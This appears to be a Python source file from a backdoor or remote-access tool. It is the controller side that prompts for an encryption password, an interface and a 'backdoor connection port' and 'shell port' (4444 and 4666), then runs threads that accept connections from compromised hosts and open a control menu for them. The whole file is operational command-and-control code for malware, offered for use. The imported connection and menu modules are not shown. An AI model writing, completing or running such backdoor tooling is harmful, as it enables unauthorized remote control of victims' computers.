import threading
from sys import exit
from time import sleep
from queue import Queue
import getpass

from utils.connection import estabilish_connection
from interface.menu import main_menu


n_threads = 2
jobs = [1, 2]
queue = Queue()

addrs = []
cons = []

ip_addr = "192.168.1.231"
port = 4444
shell_port = 4666


def create_threads():
    for _ in range(n_threads):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()
    queue.join()


def create_jobs():
    for thread_id in jobs:
        queue.put(thread_id)
    queue.join()


def work():
    global ip_addr, port, shell_port
    while True:
        val = queue.get()
        if val == 1:
            conn, addr = estabilish_connection(ip_addr, port)
            cons.append(conn)
            addrs.append(addr)
        elif val == 2:
            while True:
                sleep(0.2)
                if len(addrs) > 0:
                    main_menu(cons, addrs, ip_addr, port, shell_port, status=1)
                    break
        queue.task_done()
        exit(0)


def setup():
    global KEY, ip_addr, port, shell_port
    key = getpass.getpass("Encryption password: ")
    if len(key) < 1:
        print("Password must be set")
        exit(0)
    KEY = bytes(key, 'utf-8')
    ip_addr = input("Enter inet interface [192.168.1.231]: ")
    if ip_addr == "":
        ip_addr = "192.168.1.231"
    port = input("Enter backdoor connection port [4444]: ")
    if port == "" or int(port) == 4444:
        port = 4444
    else:
        try:
            port = int(port)
        except:
            print("Invalid port type, must be integer")
            exit(0)
    shell_port = input("Enter shell port [4666]: ")
    if shell_port == "" or int(shell_port) == 4666:
        shell_port = 4666
    else:
        try:
            shell_port = int(shell_port)
        except:
            print("Invalid port type, must be integer")
            exit(0)


def threadpool_run():
    setup()
    create_threads()
    create_jobs()
